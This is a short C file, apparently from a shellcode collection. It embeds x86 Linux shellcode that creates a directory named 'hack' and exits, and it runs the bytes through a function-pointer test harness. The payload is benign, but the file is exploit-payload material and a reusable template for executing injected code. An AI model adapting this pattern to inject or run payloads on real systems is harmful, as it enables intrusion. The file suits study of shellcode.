/*
 Filename  : mkdir_shellcode.c
 Author    : M.Acosta snow <amcx62[_at_]gmail[_dot_]com>
 Date      : 2013 August
 Location  : Lima(Peru)
 Desc	     : mkdir & exit shellcode 
 Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] =
"\x31\xc0\x50\x68\x68\x61\x63\x6b\x31\xdb\x89\xe3\x04\x27\x66\x81\xc1\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80"

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
